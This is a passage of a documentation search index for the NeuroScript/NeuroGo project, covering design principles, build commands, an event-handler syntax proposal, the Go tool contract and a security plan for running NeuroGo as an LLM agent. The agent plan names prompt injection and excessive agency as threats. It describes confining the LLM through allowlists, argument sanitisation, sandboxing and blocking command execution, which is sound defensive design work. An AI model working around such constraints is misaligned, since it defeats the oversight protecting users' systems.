world\"</code> output</li> </ol>"},{"location":"api_disc/#tldr-for-gemini","title":"TL;DR for Gemini","text":"<ol> <li>Stabilise AST structs &amp; kinds \u2014 parser, canoniser, interpreter all speak that.</li> <li>Wire canonicaliser + signer \u2014 deterministic bytes, BLAKE3, Ed25519.</li> <li>Expose ExecCommand(tree) \u2014 run only verified, vetted command trees.</li> <li>Keep comments &amp; Position in AST \u2014 for <code>api.Format</code> and diagnostics.</li> </ol> <p>Once those surfaces compile, <code>api</code> can lock onto them and external integrators need nothing beyond <code>import \"yourrepo/api\"</code>.</p>"},{"location":"build/","title":"YACC -- deprecated","text":"<p>go install golang.org/x/tools/cmd/goyacc@latest</p> <p>goyacc -o neuroscript.y.go -p \"yy\" neuroscript.y</p> <p>./neurogo/neurogo neurogo/skills HandleSkillRequest \"Create a NeuroScript skill that reverses a given input string\"</p>"},{"location":"build/#antlr-current","title":"ANTLR -- current","text":"<p>Install ANTLR and java</p> <p>In pkg/core do:</p> <p>java -jar antlr4-4.13.2-complete.jar  -Dlanguage=Go -o generated -visitor -listener -package core NeuroScript.g4</p> <p>./neurogo -debug-ast -debug-tokens skills Add 1 2</p> <p>./neurogo skills HandleSkillRequest \"Create a NeuroScript skill that reverses a given input string\"</p>"},{"location":"design_principles/","title":"NeuroScript Project Design Principles","text":"<p>Criteria against which every design choice must be weighed </p>"},{"location":"design_principles/#root-principles","title":"Root Principles","text":""},{"location":"design_principles/#1-obvious","title":"1. Obvious","text":"<ul> <li>Everything in NS must be obvious or self-documenting. </li> </ul> <p>Why? High-Agency Contributors (HACs) should behave correctly with minimal onboarding.  </p>"},{"location":"design_principles/#2-bounded","title":"2. Bounded","text":"<ul> <li>Every construct must declare positive resource bounds. </li> </ul> <p>Why? Real systems live under finite budgets; clear limits enable accountability.  </p>"},{"location":"design_principles/#3-defined","title":"3. Defined","text":"<p>\u201cNS must be obvious and picky.\u201d - Behaviour must be explicitly specified and testable. </p> <p>Why? Predictability is the bedrock of reliability and security.  </p>"},{"location":"design_principles/#4-predictable","title":"4. Predictable","text":"<ul> <li>Same inputs \u2192 same outputs \u2192 same side-effects. </li> </ul> <p>Why? If you cannot foresee consequences you cannot behave well.  </p>"},{"location":"design_principles/#5-accountable","title":"5. Accountable","text":"<p>\u201cThe bedrock of security is knowing who did what, when.\u201d - Every change is attributable to the immediate HAC and traceable up the causal chain. </p>"},{"location":"design_principles/#6-safe-by-default","title":"6. Safe-by-Default","text":"<ul> <li>The default posture denies risky or irreversible actions; opt-ins must be explicit and auditable. </li> </ul> <p>Why? A cautious baseline limits blast-radius and makes accidental harm unlikely.  </p>"},{"location":"design_principles/#derived-principles","title":"Derived Principles","text":""},{"location":"design_principles/#d1-simple","title":"D1. Simple","text":"<p>From Obvious + Defined + Bounded + Predictable - As simple as possible ... but never simpler. </p>"},{"location":"design_principles/#d2-orthogonal","title":"D2. Orthogonal","text":"<p>From Predictable + Simple - Each feature does one thing, with no hidden side-effects. - Combinations compose without new rules. </p>"},{"location":"design_principles/#d3-versioned","title":"D3. Versioned","text":"<ul> <li>Every artefact and interface advertises an explicit version. </li> </ul> <p>Why? Enables evolution without surprise breakage, guarantees reproducibility, and underpins roll-back safety.  </p>"},{"location":"design_principles/#d4-auditable","title":"D4. Auditable","text":"<p>From Accountable + Bounded + Defined - All mutations leave a tamper-evident trail (hash + timestamp + agent ID). - Inspecting costs \u2264 performing. </p>"},{"location":"design_principles/#d5-deterministic-first","title":"D5. Deterministic-First","text":"<p>From Predictable - Deterministic unless an explicit nondeterministic tool is invoked\u2014and that tool must tag its output. </p>"},{"location":"design_principles/#d6-capability-scoped","title":"D6. Capability-Scoped","text":"<p>From Defined + Bounded + Safe-by-Default - Least privilege by default; escalation is explicit and audited. - Imports never silently widen capabilities. </p>"},{"location":"design_principles/#d7-fuel-metered-everywhere","title":"D7. Fuel-Metered Everywhere","text":"<p>From Accountable + Bounded - Every phase\u2014lint, parse, static check, VM step\u2014burns fuel at a public tariff; overruns abort before neighbours starve. </p>"},{"location":"design_principles/#d8-progressive-disclosure","title":"D8. Progressive Disclosure","text":"<p>From Bounded - Minimal core syntax; advanced features gated by clear opt-ins (<code>version</code>, <code>ttl</code>, <code>command endcommand</code> blocks).  </p>"},{"location":"design_principles/#d9-reversible","title":"D9. Reversible","text":"<p>From Bounded + Versioned - Every state change has a symmetric undo (or documented rationale). - Versioned overlays + alias tables make rollback cheap. </p>"},{"location":"design_principles/#d10-minimum-surprise","title":"D10. Minimum Surprise","text":"<p>From Obvious + Predictable - Look-alike constructs act alike; hidden magic (implicit imports, silent promotions) is forbidden. </p>"},{"location":"design_principles/#d11-isolated","title":"D11. Isolated","text":"<p>From Safe-by-Default + Bounded + Predictable - Each execution runs in a sandbox with enforced fuel and capability limits; faults stay contained. </p>"},{"location":"design_principles/#d12-evolvable","title":"D12. Evolvable","text":"<p>From Versioned + Reversible - Schema and API migrations occur via additive versions and alias promotion\u2014never in-place mutation. </p> <p>:: name: NeuroScript Design Principles :: schema: spec :: serialization: md :: fileVersion: 3 :: author: Andrew Price &amp; ChatGPT-o3 :: created: 2025-06-29 :: modified: 2025-06-29 :: description: Canonical design-decision rubric for the NeuroScript language and runtime. :: tags: designPrinciple, neuroscript, fdm :: dependsOn: none :: howToUpdate: Propose edits via command block; bump fileVersion on acceptance. :: glossaryNote: actor means any entity that can initiate actions\u2014human, AI model, or autonomous computer process.</p>"},{"location":"event_handling/","title":"Design Proposal: A Consistent on...do Syntax","text":"<p>The core of the inconsistency is that on error uses means and endon, while on event uses different keywords and a different structure. We can unify them under a single, more intuitive syntax.</p> <p>Proposed New Syntax:</p> <p>For Error Handling:</p> <p>Old: on_error means ... endon New: on error do ... endon For Event Handling:</p> <p>Old: on event  [as ] ... endevent New: on event  [as ] do ... endon Benefits of this Change: <p>Consistency: Both constructs now follow the same on...do...endon pattern, making the language easier to learn and read. Clarity: do is a more active and clearer word than means for introducing a block of code that executes in response to something. Bug Resolution: Critically, this removes means from the on error statement, which I believe is the root cause of the parser ambiguity with func...means. Event Handler Lifecycle and De-registration You asked how to de-register an event handler. This requires a way to name or identify handlers so they can be targeted. Here is a proposal for that lifecycle.</p> <ol> <li>Named Event Handlers</li> </ol> <p>I propose adding an optional named clause to the on event statement. This allows you to assign a simple string literal as a unique ID to a handler.</p> <p>New on event syntax with named clause: on event  named  [as ] do ... endon <p>Example: on event \"file.updated\" named \"ui-refresher\" as event_data do ... endon</p> <ol> <li>New clear event Statement</li> </ol> <p>To de-register handlers, I propose a new clear event statement with two forms:</p> <p>Clear by Name: De-registers a single, specific handler.</p> <p>clear event named \"ui-refresher\" Clear by Event Type: De-registers all anonymous (un-named) handlers for a specific event type.</p> <p>clear event \"file.updated\" Lifecycle Semantics:</p> <p>on error: This handler does not need a name or a clear statement. As you noted, its lifecycle is simple: defining a new on error block implicitly replaces the previous one for the current scope. Anonymous on event handlers: An on event block without a named clause creates an anonymous handler. It lives until the end of the script execution or until it's cleared in bulk via clear event \"event-type\". Named on event handlers: A handler defined with named \"my-handler-name\" can be specifically removed at any time with clear event named \"my-handler-name\", giving you full control over its lifecycle.</p>"},{"location":"integration_and_extension/","title":"NeuroScript Tool \u2194 Runtime Contract (Expanded and Corrected)","text":"<p>This guide details the contract between NeuroScript tools and the runtime environment. It expands upon the original <code>tool_contract.md</code> with corrections and patterns observed in the actual codebase to provide a complete and accurate reference for developers.</p>"},{"location":"integration_and_extension/#1-the-core-principle-a-tool-is-a-go-function","title":"1. The Core Principle: A Tool is a Go Function","text":"<p>At its heart, a NeuroScript tool is a Go function with a specific signature. It receives a <code>tool.Runtime</code> interface, which is its sole gateway for interacting with the interpreter, and a slice of arguments.</p> <pre><code>// The required signature for any tool implementation.\ntype ToolFunc func(rt Runtime, args []interface{}) (interface{}, error)\n</code></pre> <p>Tools must never import the <code>interpreter</code> or <code>neurogo</code> packages directly. All interactions must be mediated through the <code>Runtime</code> interface to ensure they are sandboxed, portable, and testable.</p>"},{"location":"integration_and_extension/#2-the-toolruntime-interface-your-gateway-to-the-engine","title":"2. The <code>tool.Runtime</code> Interface: Your Gateway to the Engine","text":"<p>The <code>tool.Runtime</code> interface provides all the necessary methods for a tool to perform its function securely and effectively.</p> <pre><code>// As defined in pkg/tool/tools_types.go\ntype Runtime interface {\n    // Logging and Interactive I/O\n    Println(...any)\n    Ask(prompt string) string\n    GetLogger() interfaces.Logger\n\n    // Program State Management\n    GetVar(name string) (any, bool)\n    SetVar(name string, val any)\n\n    // Sandboxed File Access\n    SandboxDir() string\n\n    // Introspection and Composition\n    CallTool(name types.FullName, args []any) (any, error)\n    ToolRegistry() ToolRegistry // Essential for introspection\n    LLM() interfaces.LLMClient\n}\n</code></pre> <ul> <li>Logging: Use <code>GetLogger()</code> to get a structured logger instance. Example from <code>fs/tools_fs_write.go</code>: <code>interpreter.GetLogger().Debug(\"...\", \"key\", value)</code>.</li> <li>Console I/O: Use <code>Println</code> to output information and <code>Ask</code> to prompt for user input.</li> <li>State Sharing: Use <code>GetVar</code> and <code>SetVar</code> for simple, mutable state sharing between tools. This is intended for basic data like tokens or flags, not complex state.</li> <li>Secure File Access: Always use <code>SandboxDir()</code> as the root for any file operations. The <code>fs</code> tools heavily rely on this, combined with helpers like <code>security.ResolveAndSecurePath</code>, to prevent directory traversal attacks.</li> <li>Tool Composition: A tool can invoke another using <code>CallTool</code>, passing the fully qualified tool name (e.g., <code>\"math.add\"</code>) and its arguments.</li> <li>Introspection: The <code>ToolRegistry()</code> method is a powerful addition not in the original contract. It allows a tool to get information about other available tools, which is how the <code>meta.ListTools</code> and <code>meta.ToolsHelp</code> tools work.</li> </ul>"},{"location":"integration_and_extension/#3-defining-a-tool-the-toolimplementation-struct","title":"3. Defining a Tool: The <code>ToolImplementation</code> Struct","text":"<p>A tool is more than just its function; it requires a detailed specification for the interpreter to understand its capabilities. This is defined in a <code>tool.ToolImplementation</code> struct.</p> <pre><code>// Found in pkg/tool/tool_types.go\ntype ToolImplementation struct {\n    FullName types.FullName\n    Spec     ToolSpec\n    Func     ToolFunc\n}\n\ntype ToolSpec struct {\n    Name            types.ToolName  `json:\"name\"`\n    Group           types.ToolGroup `json:\"groupname\"`\n    FullName        types.FullName  `json:\"fullname\"`\n    Description     string          `json:\"description\"`\n    Category        string          `json:\"category,omitempty\"`\n    Args            []ArgSpec       `json:\"args,omitempty\"`\n    ReturnType      ArgType         `json:\"returnType\"`\n    ReturnHelp      string          `json:\"returnHelp,omitempty\"`\n    Example         string          `json:\"example,omitempty\"`\n    ErrorConditions string          `json:\"errorConditions,omitempty\"`\n}\n\ntype ArgSpec struct {\n    Name        string      `json:\"name\"`\n    Type        ArgType     `json:\"type\"`\n    Description string      `json:\"description\"`\n    Required    bool        `json:\"required\"`\n}\n</code></pre> <ul> <li>Group vs. Name: A tool belongs to a <code>Group</code> (e.g., \"fs\", \"git\", \"str\") and has a <code>Name</code> (e.g., \"Read\", \"Commit\", \"Split\"). The <code>FullName</code> (e.g., \"fs.Read\") is generated from these.</li> <li>Metadata is Key: The <code>Description</code>, <code>Category</code>, <code>Args</code>, <code>ReturnHelp</code>, <code>Example</code>, and <code>ErrorConditions</code> fields are not just comments. They are used by the <code>meta.ToolsHelp</code> tool to provide rich, runtime documentation to the user. Keep them clear and accurate.</li> </ul>"},{"location":"integration_and_extension/#4-registering-a-toolset","title":"4. Registering a Toolset","text":"<p>Tool registration is decentralized and automatic. Each tool package is responsible for registering its own tools.</p> <ol> <li>Create a <code>register.go</code> file in your tool package (e.g., <code>pkg/tool/mytools/register.go</code>).</li> <li>Define an <code>init()</code> function inside <code>register.go</code>. This Go function will be executed automatically when the package is imported.</li> <li>Call <code>tool.AddToolsetRegistration</code> from within <code>init()</code>.</li> </ol> <p>This pattern is used consistently across all toolsets like <code>fs</code>, <code>git</code>, <code>strtools</code>, <code>list</code>, and <code>time</code>.</p> <p>Example <code>pkg/tool/mytools/register.go</code>: <pre><code>package mytools\n\nimport \"github.com/aprice2704/neuroscript/pkg/tool\"\n\n// myToolsToRegister would be a []tool.ToolImplementation defined in another file\n// in this package, like tooldefs_mytools.go.\n\nfunc init() {\n    tool.AddToolsetRegistration(\n        \"mytools\", // The group name for this toolset\n        tool.CreateRegistrationFunc(\"mytools\", myToolsToRegister),\n    )\n}\n</code></pre></p> <ol> <li>Ensure your package is imported. The host binary uses a file like <code>toolbundles/all/all.go</code> to perform blank imports (<code>_ \"...\"</code>) of all tool packages, which guarantees their <code>init()</code> functions run.</li> </ol>"},{"location":"integration_and_extension/#5-authoring-and-testing-tools","title":"5. Authoring and Testing Tools","text":""},{"location":"integration_and_extension/#best-practices","title":"Best Practices","text":"<ul> <li>Argument Handling: Your <code>ToolFunc</code> receives <code>[]interface{}</code>. You are responsible for validating the argument count and performing type assertions.</li> <li>Error Handling: Don't return generic Go errors. Construct and return a <code>*lang.RuntimeError</code> using <code>lang.NewRuntimeError(code, message, underlyingError)</code>. This provides structured error information to the interpreter and the user script.</li> <li>Advanced Interfaces: For tools that need deeper integration with the interpreter (like <code>script.LoadScript</code>), you can define a more specific interface and use a type assertion on the <code>tool.Runtime</code> object. This is an advanced pattern but allows for powerful extensions.</li> </ul>"},{"location":"integration_and_extension/#testing","title":"Testing","text":"<ul> <li>Unit Tests: For private helpers within your tool package, use standard <code>package &lt;toolname&gt;</code> tests.</li> <li>Integration Tests: For testing the tool against a live interpreter, use <code>package &lt;toolname&gt;_test</code>.</li> <li>Test Setup:<ul> <li>Create a new interpreter instance for your test: <code>interp := interpreter.NewInterpreter()</code>.</li> <li>Manually register your tool(s) with the interpreter's registry: <code>interp.ToolRegistry().RegisterTool(myToolImplementation)</code>.</li> <li>Create helper functions (e.g., <code>testMyToolHelper</code>) to reduce boilerplate in table-driven tests. This is a common pattern seen in <code>tools_string_basic_test.go</code> and <code>tools_fs_helpers_test.go</code>.</li> </ul> </li> </ul>"},{"location":"integration_and_extension/#6-external-dynamic-tool-sets-roadmap","title":"6. External &amp; Dynamic Tool-Sets (Roadmap)","text":"<p>The contract is designed for future extensibility without changing the <code>Runtime</code> surface.</p> Level Mechanism Status A Out-of-tree, compiled-in: Any Go module that imports <code>tool</code> can self-register via <code>init()</code>. The host binary just needs to add a blank-import. Works Today B Optional bundles via build tags: Guard registration files with <code>//go:build</code>. Planned C Runtime-loadable plugins: Load <code>.so</code> files at runtime. Design Drafted <p>By following this contract, tools remain sandboxed, portable, and swappable, while the host Engine retains full control over logging, security, dependency injection, and future dynamic loading capabilities.</p>"},{"location":"llm_agent_facilities/","title":"Plan for Evolving NeuroGo into a Secure LLM Agent","text":""},{"location":"llm_agent_facilities/#introduction","title":"Introduction","text":""},{"location":"llm_agent_facilities/#purpose","title":"Purpose","text":"<p>This document presents a comprehensive technical plan for transforming the existing NeuroGo interpreter into a secure Large Language Model (LLM) agent, designated NeuroGo-as-llm-agent. The primary objective is to enable an LLM, such as Google's Gemini, to interact safely and effectively with a user's local environment by requesting NeuroGo to execute specific, pre-approved TOOL functions.</p>"},{"location":"llm_agent_facilities/#concept-recap","title":"Concept Recap","text":"<p>The core concept underpinning NeuroGo-as-llm-agent involves leveraging NeuroGo not as a direct executor of potentially complex NeuroScript procedures generated by an LLM, but as a constrained, local, and secure execution engine for discrete TOOL functions requested by the LLM. This shifts the execution model: instead of NeuroGo interpreting full NeuroScript logic potentially influenced or generated by an LLM, it focuses on executing well-defined, atomic tool operations on behalf of the LLM. The LLM handles the higher-level reasoning, planning, and task decomposition, while NeuroGo provides the secure interface to the local environment through its toolset, primarily utilizing the LLM's native function calling capabilities for communication. It's important to note that these agent capabilities are designed as an addition to NeuroGo's existing role as a NeuroScript interpreter, augmenting its functionality rather than replacing it.</p>"},{"location":"llm_agent_facilities/#criticality-of-security","title":"Criticality of Security","text":"<p>Security is the paramount design principle throughout this plan. Granting LLM agents, which are susceptible to manipulation techniques like prompt injection 1, the ability to interact with local system resources introduces significant risks. These include unauthorized data access or modification, execution of malicious commands, and system disruption.3 Key threats such as prompt injection 1 and insecure tool execution leading to excessive agency 3 must be rigorously addressed through architectural choices, strict validation, and layered security controls. The plan prioritizes establishing robust defenses against these and other vulnerabilities inherent in LLM-driven tool use.</p>"},{"location":"llm_agent_facilities/#scope-and-structure","title":"Scope and Structure","text":"<p>This plan encompasses the proposed architecture, the LLM interaction protocol (with a focus on Gemini Function Calling), detailed implementation steps within the NeuroGo Go codebase, a critical security design, analysis of key challenges and risks with mitigation strategies, phased development milestones, and an examination of how this capability aligns with the broader NeuroScript project goals. The subsequent sections detail each of these aspects.</p>"},{"location":"llm_agent_facilities/#section-1-proposed-architecture-for-neurogo-as-llm-agent","title":"Section 1: Proposed Architecture for NeuroGo-as-llm-agent","text":""},{"location":"llm_agent_facilities/#11-architectural-overview","title":"1.1. Architectural Overview","text":"<p>The proposed architecture positions NeuroGo as a specialized, secure \"Tool Execution Backend\" orchestrated by an external LLM. The interaction flow follows a controlled cycle: User -&gt; LLM (e.g., Gemini) -&gt; NeuroGo Agent -&gt; Secure Tool Execution -&gt; LLM -&gt; User. The LLM is responsible for natural language understanding, reasoning, planning the sequence of actions, and deciding which NeuroGo TOOL function needs to be invoked to accomplish a sub-task.6 NeuroGo, operating in agent mode, receives these requests, validates them against stringent security policies, executes the permitted tools within a sandboxed context, and returns the results to the LLM for synthesis into a final user response or further planning.</p> <p>This architecture aligns with several established patterns for building agentic systems:</p> <ul> <li>Augmented LLM 8: The system's core is the external LLM, augmented with the specialized capabilities provided by the NeuroGo toolset. NeuroGo acts as the secure execution layer for these augmentations.</li> <li>LLM + Tools + Memory 9: This pattern is directly applicable. The LLM provides the reasoning, NeuroGo implements the secure \"Tools\" execution layer, and NeuroGo itself must incorporate \"Memory\" management for conversation history and security context across interaction turns.</li> <li>Tool Use Pattern 10: The design explicitly follows this pattern, equipping the LLM with external functionalities (local system interaction) mediated by NeuroGo's tools.</li> <li>ReAct Pattern Elements 6: The fundamental interaction loop mirrors elements of the Reason-Act (ReAct) pattern: the LLM reasons, requests an action (NeuroGo tool call), receives an observation (tool result), and reasons again. Initially, the planning complexity within the LLM might be simpler than full ReAct implementations, but the core cycle is present.</li> </ul> <p>A fundamental aspect of this architecture is the clear separation of concerns. LLMs, while powerful reasoning engines, are inherently difficult to fully secure against prompt manipulation.11 Granting them direct execution capabilities on a local machine represents an unacceptable level of risk, falling under the category of \"Excessive Agency\".3 This architecture mitigates that risk by using the LLM for its strengths (reasoning, natural language processing, planning) and delegating the sensitive execution phase to NeuroGo, which operates under strict, locally enforced security controls. This minimizes the attack surface directly exposed by potential LLM vulnerabilities.</p>"},{"location":"llm_agent_facilities/#12-core-components","title":"1.2. Core Components","text":"<p>The NeuroGo-as-llm-agent system comprises several interacting components:</p> <ul> <li>User Interface/Client: (External to NeuroGo modifications) The application layer responsible for capturing user input and displaying LLM/agent responses.</li> <li>LLM API (e.g., Gemini): The external cloud-based service providing the core intelligence. It processes user prompts, manages conversational context (partially), plans execution steps, generates tool call requests via its function calling mechanism 12, and synthesizes final responses based on tool results.</li> <li>NeuroGo Agent Core (Go): The central piece undergoing modification. This component will:<ul> <li>Listen for and receive structured function call requests from the LLM API.</li> <li>Interact with the Conversation State Manager to retrieve history and store new turns.</li> <li>Invoke the Security Layer to validate incoming tool requests.</li> <li>Dispatch validated requests to the Tool Registry &amp; Executor.</li> <li>Format tool execution results into the structure expected by the LLM API.</li> <li>Manage the overall interaction loop with the LLM API.</li> </ul> </li> <li>Security Layer (Go Module within NeuroGo): A distinct logical (and potentially physical code module) layer acting as the gatekeeper for all LLM-initiated tool executions. Its responsibilities include:<ul> <li>Enforcing the Tool Allowlist configuration.</li> <li>Performing rigorous Argument Validation &amp; Sanitization.3</li> <li>Enforcing sandboxing constraints (e.g., ensuring paths are resolved via SecureFilePath).</li> <li>Applying context-aware restrictions (e.g., blocking TOOL.ExecuteCommand 13 when called by the LLM). This centralized approach simplifies security policy implementation, auditing, and future updates.1</li> </ul> </li> <li>Tool Registry &amp; Executor (Existing NeuroGo mechanism, enhanced): The existing NeuroGo component that registers available TOOL functions and executes their Go code. It requires enhancement to:<ul> <li>Accept security context information (e.g., sandboxing parameters, caller context).</li> <li>Ensure tools adhere to security constraints during execution.</li> </ul> </li> <li>Conversation State Manager (Go Module within NeuroGo): A new component responsible for maintaining the history of the interaction across multiple turns. This includes:<ul> <li>Storing user prompts, LLM text responses, LLM function call requests, and NeuroGo function execution results.15</li> <li>Maintaining the active security configuration (allowlist, sandbox root) for the current session.</li> <li>Formatting the history correctly for submission to the LLM API on each turn.</li> </ul> </li> </ul>"},{"location":"llm_agent_facilities/#13-interaction-flow-detailed-cycle","title":"1.3. Interaction Flow (Detailed Cycle)","text":"<p>The interaction between these components follows a precise cycle:</p> <ol> <li>The user submits a prompt via the User Interface/Client.</li> <li>The client sends the prompt, along with the current conversation history retrieved from NeuroGo's Conversation State Manager, to the designated LLM API (e.g., Gemini).</li> <li>The LLM analyzes the input and its available function declarations (representing NeuroGo TOOLs). If it determines an action requiring local interaction is needed, it formulates a tool call.</li> <li>The LLM API responds not with direct execution, but with a structured FunctionCall object specifying the target TOOL.FunctionName and the arguments it derived.12 This inability of the LLM to directly execute the function is a key architectural choice.12</li> <li>The NeuroGo Agent Core receives this FunctionCall object.</li> <li>NeuroGo passes the tool name and arguments to the Security Layer for validation.</li> <li>The Security Layer performs its checks sequentially:<ul> <li>Verifies the requested tool name is present in the configured allowlist for LLM invocation.</li> <li>Performs strict validation and sanitization on the arguments provided by the LLM, treating them as untrusted input.17</li> <li>Checks for and applies any context-specific restrictions (e.g., denying the call if it's a high-risk tool like TOOL.ExecuteCommand 13 in the LLM context 3).</li> </ul> </li> <li>If all security checks pass, the NeuroGo Agent Core dispatches the call, providing the validated (and potentially sanitized) arguments to the Tool Registry/Executor. Sandboxing mechanisms (like SecureFilePath) are typically enforced within the tool's implementation, guided by the security context established by the Security Layer.</li> <li>The requested TOOL function executes its logic, adhering to any imposed security constraints (e.g., accessing files only within the designated sandboxed directory).</li> <li>The TOOL function returns its result (e.g., file content, command output, success/error status) back to the NeuroGo Agent Core.</li> <li>NeuroGo formats this result into a FunctionResponse structure, suitable for the LLM API.12</li> <li>NeuroGo updates the Conversation State Manager, adding the FunctionCall and the corresponding FunctionResponse to the history.</li> <li>NeuroGo sends the FunctionResponse (along with the updated conversation history) back to the LLM API.</li> <li>The LLM processes the tool's result, incorporates it into its reasoning, and generates the next response. This might be another FunctionCall if more actions are needed, or a final natural language answer for the user.</li> <li>The LLM API sends this final response back to NeuroGo/client.</li> <li>The client displays the LLM's response to the user.</li> </ol> <p>This cycle repeats for each turn of the conversation requiring tool interaction. The choice of the Gemini API aligns well with this architecture. Its function calling mechanism, which returns a request object rather than attempting direct execution 12, naturally supports the secure delegation model by providing the necessary interception point for NeuroGo's security layer.</p>"},{"location":"llm_agent_facilities/#section-2-llm-interaction-protocol-via-gemini-function-calling","title":"Section 2: LLM Interaction Protocol via Gemini Function Calling","text":""},{"location":"llm_agent_facilities/#21-primary-mechanism-gemini-api-function-calling","title":"2.1. Primary Mechanism: Gemini API Function Calling","text":"<p>The primary and recommended protocol for communication between the LLM and NeuroGo will be the native Function Calling feature provided by the Gemini API.12 This mechanism allows NeuroGo to declare its available TOOLs to the LLM in a structured format.</p> <p>The implementation will require NeuroGo to generate FunctionDeclaration objects for each allowlisted TOOL. Each declaration must include 12: *   Name: The exact TOOL.FunctionName string. *   Description: A clear, concise natural language description of what the tool does, its purpose, and when it should be used. This description is critical for the LLM to accurately determine when to call the tool.12 This information can be derived from the mandatory COMMENT: blocks within NeuroScript procedures or associated metadata. *   Parameters: An object describing the parameters the tool accepts, following the OpenAPI JSON Schema specification (subset supported by Gemini). For each parameter, this includes its name, type (e.g., string, integer, boolean, array, object), a description, and whether it is required.12</p> <p>Generating these declarations accurately is vital. While the Gemini Python SDK offers utilities to infer schemas from type-annotated Python functions 7, NeuroGo will need a Go-based implementation. This could involve using Go's reflection capabilities to inspect the registered TOOL function signatures for parameter names and types, combined with parsing structured comments or metadata associated with each tool to extract the necessary descriptions. The quality and precision of these declarations directly influence the LLM's ability to correctly invoke tools and provide appropriate arguments, which has significant implications for both functionality and security. Vague descriptions or incorrect parameter definitions increase the risk of the LLM making erroneous or potentially harmful requests.12</p>"},{"location":"llm_agent_facilities/#22-data-structures","title":"2.2. Data Structures","text":"<p>The interaction relies on specific JSON structures exchanged via the Gemini API:</p> <ul> <li>Tool Request (LLM -&gt; NeuroGo): When the LLM decides to call a tool, the API response will contain a functionCall part. NeuroGo must parse this structure, which typically includes 12:<ul> <li>name: (String) The name of the function (tool) the LLM wants to execute (e.g., \"TOOL.ReadFile\").</li> <li>args: (Object/Map) A JSON object containing the arguments for the function, with parameter names as keys and their corresponding values (e.g., {\"path\": \"/path/to/file.txt\"}).</li> </ul> </li> <li>Tool Result (NeuroGo -&gt; LLM): After NeuroGo executes the tool (following security validation), it must send the result back to the LLM API. This is done by including a Part in the next request to the API containing a functionResponse object 12:<ul> <li>name: (String) The name of the function that was executed (matching the functionCall.name).</li> <li>response: (Object/Map) A JSON object containing the result of the function execution. This should include a field indicating success or failure, and the actual data returned by the tool (e.g., {\"content\": \"file content here\"}) or structured error information.</li> </ul> </li> </ul> <p>The explicit nature of this request-response cycle for tool execution is a key security feature. The LLM requests an action, but NeuroGo intercepts the request, performs validation, executes the action in a controlled manner, and then explicitly reports the outcome back to the LLM.12 This prevents the LLM from having any direct, unchecked pathway to execution.</p>"},{"location":"llm_agent_facilities/#23-handling-multipleparallel-tool-calls","title":"2.3. Handling Multiple/Parallel Tool Calls","text":"<p>The Gemini API supports suggesting multiple function calls within a single response turn, potentially enabling parallel execution of independent tasks.12 While this offers potential performance benefits, it also increases complexity, particularly regarding security validation and state management.</p> <p>For the initial implementation (Phase 1), it is recommended that NeuroGo handle multiple functionCall objects received in a single turn sequentially. This simplifies the logic and ensures that the security context is clearly defined for each call. The architecture should, however, be designed with the possibility of future parallel execution in mind. If parallelism is implemented later, the Security Layer must be capable of validating each proposed parallel call independently before dispatch, and the Tool Executor must handle concurrent execution safely.</p>"},{"location":"llm_agent_facilities/#24-function-calling-mode-configuration","title":"2.4. Function Calling Mode Configuration","text":"<p>The Gemini API provides a function_calling_config parameter with different modes to control the LLM's tool usage behavior 12:</p> <ul> <li>AUTO (Default): The LLM decides whether to respond with text or a function call based on the prompt and context.</li> <li>ANY: The LLM is forced to respond with a function call. An optional allowed_function_names list can restrict the LLM's choice to a specific subset of the declared tools.</li> <li>NONE: The LLM is prohibited from making function calls, behaving as if no tools were declared.</li> </ul> <p>It is recommended to start with AUTO mode to provide the LLM with maximum flexibility. However, NeuroGo should allow configuration of this mode. For specific use cases requiring more constrained behavior, ANY mode, possibly combined with allowed_function_names, could be employed to ensure the LLM only attempts specific, expected tool interactions.</p>"},{"location":"llm_agent_facilities/#25-fallback-strategy-structured-data-in-chat","title":"2.5. Fallback Strategy (Structured Data in Chat)","text":"<p>In scenarios where native function calling might fail or prove problematic (e.g., unexpected API changes, complex argument structures not easily representable), a fallback mechanism should be considered, although it is less robust and less preferred.</p> <p>This fallback would involve defining a specific structured format (e.g., a JSON object within a designated markdown code block like json_tool_request...) that the LLM could embed within its standard text response. NeuroGo would need additional logic in its response processing pipeline to detect these specific blocks, parse the JSON content, extract the tool name and arguments, route them through the exact same Security Layer and Tool Executor as native function calls, capture the result, format it similarly (e.g., json_tool_result...), and inject this result back into the conversation history before sending the next request to the LLM. This approach adds parsing complexity and relies on the LLM consistently adhering to the custom format.</p>"},{"location":"llm_agent_facilities/#section-3-implementation-plan-for-neurogo-modifications-go","title":"Section 3: Implementation Plan for NeuroGo Modifications (Go)","text":"<p>Implementing the NeuroGo-as-llm-agent capability requires significant modifications and additions to the existing NeuroGo Go codebase. The following outlines the key areas of work:</p>"},{"location":"llm_agent_facilities/#31-llmgo-adaptations","title":"3.1. llm.go Adaptations","text":"<p>The existing code responsible for interacting with LLMs (presumably in llm.go, based on query context 20) needs substantial enhancement to support the full Gemini function calling workflow.12 This involves:</p> <ul> <li>Function Declaration Generation: Implement logic to dynamically generate FunctionDeclaration JSON structures. This process should iterate through the registered (and allowlisted) NeuroGo TOOLs, using Go reflection to determine function parameter names and types, and parsing associated COMMENT: blocks or metadata to extract meaningful descriptions. Robust parsing and error handling are crucial here.</li> <li>API Request Construction: Modify the code that builds the request to the Gemini API (GenerateContentRequest). It must now include the generated tools field containing the list of FunctionDeclarations. Crucially, it must also include the full conversation history, correctly formatted with user messages, model responses, and previous functionCall/functionResponse pairs, managed by the new Conversation State Manager.</li> <li>API Response Parsing: Enhance the response handling logic to specifically detect and extract functionCall parts from the GenerateContentResponse. It needs to differentiate between a standard text response and a request to execute a tool.</li> <li>Interaction Loop Management: Implement the core agent loop logic. This involves: receiving a response, checking for functionCalls, if found: dispatching to the Security Layer and Tool Executor, receiving the result, formatting it as a functionResponse, updating the state manager, and sending the result back to the Gemini API in the next request. If no functionCall is received, the loop handles the text response appropriately (e.g., passing it to the client).</li> </ul>"},{"location":"llm_agent_facilities/#32-conversation-state-management","title":"3.2. Conversation State Management","text":"<p>A new, dedicated component for managing conversation state is required. This state manager (likely a Go struct within a new package) must:</p> <ul> <li>Store Conversation History: Maintain an ordered list of conversational turns, adhering precisely to the structure expected by the Gemini API (alternating user/model roles, including functionCall and functionResponse parts where applicable).12 This history is essential context for the LLM. Memory is a fundamental component of effective agent architectures.15</li> <li>Store Session Context: Hold session-specific information, particularly the active security configuration (loaded tool allowlist, sandboxing root directory, current security level). This context is needed by the Security Layer during validation.</li> <li>Manage Context Window: Implement strategies to handle potential context window limitations of the LLM, especially in long conversations. This might involve simple truncation, more sophisticated summarization techniques, or relying on 